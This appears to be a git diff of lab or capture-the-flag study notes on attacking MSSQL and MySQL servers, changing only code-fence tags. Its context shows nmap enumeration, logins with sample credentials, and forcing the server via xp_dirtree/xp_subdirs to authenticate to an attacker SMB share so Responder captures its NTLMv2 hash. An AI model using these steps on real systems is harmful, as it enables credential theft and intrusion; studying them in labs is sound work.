@@ -2,7 +2,7 @@
 ## Enumeration
 By default, **MSSQL** uses ports `TCP/1433` and UDP/1434, and **MySQL** uses `TCP/3306`. However, when **MSSQL** operates in a "hidden" mode, it uses the `TCP/2433` port. We can use Nmap's default scripts `-sC` option to enumerate database services on a target system:
 
-```sh
+```shellsession
 $ nmap -Pn -sV -sC -p1433 10.10.10.125
 ```
 
@@ -32,7 +32,7 @@ $ nmap -Pn -sV -sC -p1433 10.10.10.125
 
 ## Protocol Specific Attacks
 ### Read/Change the Database
-```sh
+```shellsession
 # MySQL
 $ mysql -u julio -pPassword123 -h 10.129.20.13
 
@@ -52,7 +52,7 @@ $ mssqlclient.py julio:'MyPassword!'@10.129.203.7
 
 When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`. The full command would look like:
 
-```sh
+```shellsession
 $ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
 ```
 
@@ -212,7 +212,7 @@ xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned
 
 If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.
 
-```sh
+```shellsession
 # XP_SUBDIRS Hash Stealing with Responder
 $ sudo responder -I tun0
 
@@ -352,7 +352,7 @@ As we have seen, we can now execute queries with `sysadmin` privileges on the li
      - `$ sqlcmd -S 10.129.32.70 -U htbdbuser -P 'MSSQLAccess01!' -y 30 -Y 30` → Login to the MSSQL Server using the provided credential `htbdbuser:MSSQLAccess01!`
      - `1> EXEC master..xp_dirtree '\\10.10.15.253\share\'` and `2> go` → Use `xp_dirtree` undocumented stored procedures to retrieve a list of child directories under a specified parent directory from the file system. When we use this stored procedures and point it to our SMB server (10.10.15.253), the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.
      - Capture the NTLMv2 hash at Responder:
-      ```sh
+      ```shellsession
       $ sudo responder -I tun0
       <SNIP>
       [SMB] NTLMv2-SSP Client   : 10.129.32.70
